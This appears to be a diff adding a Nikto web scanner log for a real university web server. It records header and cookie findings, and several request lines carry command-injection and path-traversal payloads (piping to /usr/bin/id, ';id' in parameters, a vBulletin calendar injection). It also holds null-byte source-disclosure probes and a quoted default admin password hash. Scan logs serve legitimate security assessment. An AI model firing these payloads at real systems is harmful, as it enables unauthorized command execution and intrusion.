@@ -1,0 +1,43 @@
+- Nikto v2.1.5/2.1.5
++ Target Host: www.it.tuwien.ac.at
++ Target Port: 443
++ GET /: Uncommon header 'x-ua-compatible' found, with contents: IE=edge
++ GET /: Uncommon header 'strict-transport-security' found, with contents: max-age=63072000;
++ GET /: Uncommon header 'x-content-type-options' found, with contents: nosniff
++ GET /: Uncommon header 'x-xss-protection' found, with contents: 1;mode=block
++ GET /: Uncommon header 'x-frame-options' found, with contents: SAMEORIGIN
++ GET /: Cookie TYPO3MODE created without the secure flag
++ GET /: Cookie TYPO3MODE created without the httponly flag
++ GET //typo3/: File/dir '/typo3/' in robots.txt returned a non-forbidden or redirect HTTP code (302)
++ GET //typo3/sysext/frontend/Resources/Public/*/: File/dir '/typo3/sysext/frontend/Resources/Public/*/' in robots.txt returned a non-forbidden or redirect HTTP code (302)
++ GET //404/: File/dir '/404/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ GET /robots.txt: "robots.txt" contains 5 entries which should be manually viewed.
++ GET /: Hostname 'www.it.tuwien.ac.at' does not match certificate's CN 'institute.tuwien.ac.at'
++ GET /: Multiple index files found: index.php3, index.php
++ -877: TRACE /: HTTP TRACE method is active, suggesting the host is vulnerable to XST
++ GET /web-console/ServerInfo.jsp%00: /web-console/ServerInfo.jsp%00: JBoss 3.2.1 with jetty seems to disclose source code.
++ GET /fileadmin/_processed_/b/2/config.php: Uncommon header 'content-security-policy' found, with contents: default-src 'self'; script-src 'none'; style-src 'none'; object-src 'none';
++ GET /webmail/: Uncommon header 'x-redirect-by' found, with contents: TYPO3 Redirect 1049
++ -576: GET /%00/: /%00/: Weblogic allows directory listings with %00 (or indexing is enabled), upgrade to v6.0 SP1 or higher. BID-2513.
++ -576: GET /%2e/: /%2e/: Weblogic allows source code or directory listing, upgrade to v6.0 SP1 or higher. BID-2513
++ -576: GET /%2f/: /%2f/: Weblogic allows source code or directory listing, upgrade to v6.0 SP1 or higher. BID-2513
++ -576: GET /%5c/: /%5c/: Weblogic allows source code or directory listing, upgrade to v6.0 SP1 or higher. BID-2513
++ -576: GET /index.jsp%00x: /index.jsp%00x: Bea WebLogic 6.1 SP 2 discloses source by appending %00x to a JSP request. Upgrade to a version newer than 6.2 SP 2 for Win2k. BID-2513
++ -724: GET /cgi-bin/ans.pl?p=../../../../../usr/bin/id|&blah: /cgi-bin/ans.pl?p=../../../../../usr/bin/id|&blah: Avenger's News System allows commands to be issued remotely.
++ -724: GET /cgi-bin/ans/ans.pl?p=../../../../../usr/bin/id|&blah: /cgi-bin/ans/ans.pl?p=../../../../../usr/bin/id|&blah: Avenger's News System allows commands to be issued remotely.
++ GET /cgi-bin/whois.cgi?action=load&whois=%3Bid: /cgi-bin/whois.cgi?action=load&whois=%3Bid: This script allows commands to be executed remotely.
++ GET /modules.php?name=Network_Tools&file=index&func=ping_host&hinput=%3Bid: /modules.php?name=Network_Tools&file=index&func=ping_host&hinput=%3Bid: PHP-Nuke add-on NetTools below 0.3 allow for command execution. Upgrade to a new version.
++ GET /nuke/modules.php?name=Network_Tools&file=index&func=ping_host&hinput=%3Bid: /nuke/modules.php?name=Network_Tools&file=index&func=ping_host&hinput=%3Bid: PHP-Nuke add-on NetTools below 0.3 allow for command execution. Upgrade to a new version.
++ GET /phpnuke/html/.php?name=Network_Tools&file=index&func=ping_host&hinput=%3Bid: /phpnuke/html/.php?name=Network_Tools&file=index&func=ping_host&hinput=%3Bid: PHP-Nuke add-on NetTools below 0.3 allow for command execution. Upgrade to a new version.
++ GET /phpnuke/modules.php?name=Network_Tools&file=index&func=ping_host&hinput=%3Bid: /phpnuke/modules.php?name=Network_Tools&file=index&func=ping_host&hinput=%3Bid: PHP-Nuke add-on NetTools below 0.3 allow for command execution. Upgrade to a new version.
++ GET /sitemap.xml: Uncommon header 'x-robots-tag' found, with contents: noindex
++ -3268: GET /icons/: /icons/: Directory indexing found.
++ -3299: GET /forumscalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22: /forumscalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22: Vbulletin allows remote command execution. See http://www.securiteam.com/securitynews/5IP0B203PI.html
++ -3299: GET /forumzcalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22: /forumzcalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22: Vbulletin allows remote command execution. See http://www.securiteam.com/securitynews/5IP0B203PI.html
++ -3299: GET /htforumcalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22: /htforumcalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22: Vbulletin allows remote command execution. See http://www.securiteam.com/securitynews/5IP0B203PI.html
++ -3299: GET /vbcalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22: /vbcalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22: Vbulletin allows remote command execution. See http://www.securiteam.com/securitynews/5IP0B203PI.html
++ -3299: GET /vbulletincalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22: /vbulletincalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22: Vbulletin allows remote command execution. See http://www.securiteam.com/securitynews/5IP0B203PI.html
++ -724: GET /ans.pl?p=../../../../../usr/bin/id|&blah: /ans.pl?p=../../../../../usr/bin/id|&blah: Avenger's News System allows commands to be issued remotely.  http://ans.gq.nu/ default admin string 'admin:aaLR8vE.jjhss:root@127.0.0.1', password file location 'ans_data/ans.passwd'
++ -724: GET /ans/ans.pl?p=../../../../../usr/bin/id|&blah: /ans/ans.pl?p=../../../../../usr/bin/id|&blah: Avenger's News System allows commands to be issued remotely.
++ GET /icons/README: Server leaks inodes via ETags, header found with file /icons/README, fields: 0x13f4 0x438c034968a80 
++ -3233: GET /icons/README: /icons/README: Apache default file found.
